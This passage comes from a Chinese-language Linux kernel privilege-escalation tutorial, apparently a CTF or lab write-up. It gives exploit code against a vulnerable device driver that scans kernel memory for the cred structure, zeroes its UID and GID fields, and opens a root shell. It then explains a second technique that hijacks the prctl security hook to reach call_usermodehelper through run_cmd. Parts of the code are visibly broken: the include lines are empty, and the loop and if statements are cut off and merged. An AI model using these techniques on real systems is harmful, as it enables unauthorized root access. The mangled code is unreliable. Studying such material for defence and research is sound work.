        kgid_t        sgid;                    /* saved GID of the task */
        kuid_t        euid;                    /* effective UID of the task */
        kgid_t        egid;                    /* effective GID of the task */
        kuid_t        fsuid;                    /* UID for VFS ops */
        kgid_t        fsgid;                    /* GID for VFS ops */
        unsigned    securebits;                /* SUID-less security management */
        kernel_cap_t    cap_inheritable;     /* caps our children can inherit */
        kernel_cap_t    cap_permitted;        /* caps we're permitted */
        kernel_cap_t    cap_effective;        /* caps we can actually use */
        kernel_cap_t    cap_bset;            /* capability bounding set */
        kernel_cap_t    cap_ambient;        /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char    jit_keyring;        /* default keyring to attach requested keys to */
        struct key __rcu *session_keyring;    /* keyring inherited over fork */
        struct key    *process_keyring;         /* keyring private to this process */
        struct key    *thread_keyring;         /* keyring private to this thread */
        struct key    *request_key_auth;         /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;                /* subjective LSM security */
    #endif
        struct user_struct *user;            /* real user ID subscription */
        struct user_namespace *user_ns;     /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;        /* supplementary groups for euid/fsgid */
        struct rcu_head    rcu;                /* RCU deletion hook */
    };
我们只要将结构体的`uid~fsgid`(即前`28`个字节)全部覆写为`0`即可提权该线程(`root uid`为`0`)
#### 寻找`cred`结构体
那么首先，我们需要在内存中找到`cred`结构体的位置才能真正对其进行写操作。
`task_struct`里有个`char
comm[TASK_COMM_LEN];`成员，可通过`PRCTL`函数中的`PR_SET_NAME`功能，设置为指定的一个小于`16`字节的字符串：
    char target[16] = "This_is_target!";
    prctl(PR_SET_NAME,target);
`task_struct`是通过调用`kmem_cache_alloc_node()`分配的，所以`task_struct`应该存在于内核的动态分配区域。因此我们的寻找范围应该在`0xFFFF880000000000~0xFFFFC80000000000`。
    size_t cred , real_cred , target_addr;
    char *buff = malloc(0x1000);
    for (size_t addr=0xFFFF880000000000; addr
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    void init(){
            setbuf(stdin,0);
            setbuf(stdout,0);
            setbuf(stderr,0);
    }
    size_t user_cs, user_rflags, user_ss, user_rsp;
    struct init_args
    {
        size_t size;
    };
    struct realloc_args
    {
        int grow;
        size_t size;
    };
    struct read_args
    {
        size_t buff;
        size_t count;
    };
    struct seek_args
    {
        size_t new_pos;
    };
    struct write_args
    {
        size_t buff;
        size_t count;
    };
    void save_user_status(){
        __asm__(
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
        );
        puts("[+] Save User Status");
        printf("user_cs = %pn",user_cs);
        printf("user_ss = %pn",user_ss);
        printf("user_rsp = %pn",user_rsp);
        printf("user_rflags = %pn",user_rflags);
        puts("[+] Save Success");
    }
    void exploit(){
        int fd = open("/dev/vulnerable_device",0);
        if (fd  1){
            if(!strcmp(argv[1],"--breakpoint")){
                printf("[%p]n",exploit);
            }
            return 0;
        }
        save_user_status();
        exploit();
        if(getuid() == 0) {
            printf("[!!!] Now! You are root! [!!!]n");
            system("/bin/sh");
        }else{
            printf("[XXX] Fail! Something wrong！ [XXX]n");
        }
        return 0;
    }
####  姿势总结
  1. 这种提权姿势最核心的就是修改`cred`结构体。
  2. 除了任意地址读写，如果分配的大小合适，我们可以利用`Use-After-Free`直接控制整个结构体进行修改。
  3. **这种方案不受`kaslr`保护的影响！**
### 第二种提权姿势-劫持`prctl`函数调用`call_usermodehelper()`
#### 关于`prctl`函数
`prctl`函数在`/v4.6-rc1/source/kernel/sys.c#L2075`处实现
    SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
            unsigned long, arg4, unsigned long, arg5)
    {
        ......
        error = security_task_prctl(option, arg2, arg3, arg4, arg5);
        if (error != -ENOSYS)
            return error;
        ......
    }
可以发现，当我们调用`prctl`时，它会调用`security_task_prctl`并传入五个参数。
`security_task_prctl`函数在`/v4.6-rc1/source/security/security.c#L990`处实现。
    int security_task_prctl(int option, unsigned long arg2, unsigned long arg3,
                 unsigned long arg4, unsigned long arg5)
    {
        int thisrc;
        int rc = -ENOSYS;
        struct security_hook_list *hp;
        list_for_each_entry(hp, &security_hook_heads.task_prctl, list) {
            thisrc = hp->hook.task_prctl(option, arg2, arg3, arg4, arg5);
            if (thisrc != -ENOSYS) {
                rc = thisrc;
                if (thisrc != 0)
                    break;
            }
        }
        return rc;
    }
函数会调用`hp->hook.task_prctl`，若我们拥有任意地址写的能力，我们就可以通过调试确定这个指针的位置，进而劫持这个指针执行任意代码。
**此处有一个细节，传入该函数的五个参数中，第一个参数是`int`型参数，也就是说，我们所要执行的代码，其接受的第一个参数必须在`32`位范围内，超出的部分将被直接截断，这直接限制了我们在`64`位下开展相关利用！**
#### 关于`call_usermodehelper`函数
`call_usermodehelper`函数在`/v4.6-rc1/source/kernel/kmod.c#L616`处实现，此处我们不去深究它的具体实现，在官方文档中，这个函数的描述如下：
#####  函数原型
    int call_usermodehelper(char *path, char **argv, char **envp, int wait)
#####  函数用途
准备并启动用户模式应用程序
#####  函数参数
  1. [@path](https://github.com/path "@path")：用户态可执行文件的路径
  2. [@argv](https://github.com/argv "@argv")：进程的参数列表
  3. [@envp](https://github.com/envp "@envp")：进程环境变量
  4. [@wait](https://github.com/wait "@wait"): 是否为了这个应用程序进行阻塞，直到该程序运行结束并返回其状态。(当设置为`UMH_NO_WAIT`时，将不进行阻塞，但是如果程序发生问题，将不会收到任何有用的信息，这样就可以安全地从中断上下文中进行调用。)
#####  函数备注
此函数等效于使用`call_usermodehelper_setup()`和`call_usermodehelper_exec()`。
简而言之，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令(注意命令中的参数要用全路径，不能用相对路径)
⚠：在讲述此种利用原理的[原文章](http://powerofcommunity.net/poc2016/x82.pdf)中提到在安卓利用时需要关闭`SEAndroid`机制。
这里可以注意到，尽管`call_usermodehelper`可以很方便的使我们拥有从任意地址读写到任意代码执行的能力，但是，它的第一个参数仍然是一个地址，在`64`位下，它依然会被截断！
#### 间接调用`call_usermodehelper`函数
此处我们可以借鉴一下`ROP`的思路，如果能有其他的函数，它的内部调用了`call_usermodehelper`函数，且我们需要传入的第一个参数可以是`32`位值的话，我们就可以对其进行利用。
这里我们能找到一条利用链，首先是定义在`/v4.6-rc1/source/kernel/reboot.c#L392`的`run_cmd`函数
    static int run_cmd(const char *cmd)
    {
        char **argv;
        static char *envp[] = {
            "HOME=/",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL
        };
        int ret;